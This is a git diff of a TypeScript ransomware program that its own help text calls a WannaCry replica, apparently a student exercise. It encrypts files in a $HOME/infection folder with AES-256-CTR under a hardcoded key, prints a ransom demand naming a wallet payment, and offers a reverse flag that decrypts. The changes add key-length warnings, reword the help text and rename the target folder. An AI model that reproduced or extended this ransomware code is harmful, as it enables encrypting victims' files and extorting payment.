@@ -2,7 +2,13 @@ import * as crypto from "crypto";
 import fs from 'fs';
 
 const KEY: string = 'IThr1YRwjTxtrtzbM7RUbF0UdVDx9qNjYTryvf5s1Gih9xnSKl51INbX3NgPcQEJ3W-1ZtpJM1LP2gszMNqfWQ';
+if (KEY.length < 16) {
+    console.warn('Need a 16 bytes long string!!')
+}
 let key: string = crypto.createHash('sha256').update(KEY).digest('base64').substring(0, 32);
+if (key.length < 16) {
+    console.warn('Need a 16 bytes long string!!')
+}
 const algo: string = 'aes-256-ctr';
 let silent: boolean = false;
 let dir_path: string | undefined;
@@ -29,11 +35,12 @@ const extensions: string[] = [
 ];
 
 const display_help = ():void => {
-    console.log('\t- This is a replica of WannaCry');
+    console.log('\t- This is a shity, almost non working, wanabe, replica of WannaCry');
     console.log('\t- Send 1000 Wallet to loumouli to receive the key needed for decrypting your file')
-    console.log('\t\t--reverse/-r [KEY] : reverse the infection');
-    console.log('\t\t--silent/-s : the program will not produce any output');
-    console.log('\t\t--version/-v: display the version of the program');
+    console.log('\t\t-r/--reverse [KEY] : reverse the infection');
+    console.log('\t\t-s/--silent : the program will not produce any output');
+    console.log('\t\t-v/--version: display the version of the program');
+    console.log('\t\t-h/--help: display the help of the program');
 }
 
 const check_ext = (file: string): boolean => {
@@ -148,9 +155,9 @@ dir_path = env["HOME"];
 if (dir_path == undefined) {
     console.warn('cant find $HOME env value');
 } else {
-    console.log("HOME var found = ", dir_path);
+    // console.log("HOME var found = ", dir_path);
     try {
-        dir_path += '/inception';
+        dir_path += '/infection';
         if (dir_path)
             await main(process.argv);
     } catch (err) {
